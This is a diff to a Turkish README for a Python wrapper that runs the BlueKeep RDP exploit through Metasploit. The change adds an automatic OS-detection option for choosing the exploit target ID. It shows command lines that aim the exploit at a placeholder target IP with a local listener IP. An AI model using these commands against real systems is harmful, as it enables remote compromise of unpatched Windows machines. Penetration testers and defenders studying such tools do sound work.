@@ -109,6 +109,15 @@ Parametreler:
 
 ### Metasploit ile Sömürü
 
+#### Otomatik OS Tespiti
+İşletim sistemi tespiti yaparak otomatik TARGET ID belirleme:
+```bash
+python3 metasploit_bluekeep.py -i HEDEF_IP -A
+```
+
+Bu parametre hedefin işletim sistemini tespit ederek (Windows 7 SP1, Windows 7 SP0, Windows Server 2008 R2 vb.) 
+en uygun TARGET ID değerini belirleyecektir.
+
 #### Automatic Runner
 ```bash
 python3 metasploit_bluekeep.py -i HEDEF_IP -l YEREL_IP -t 2
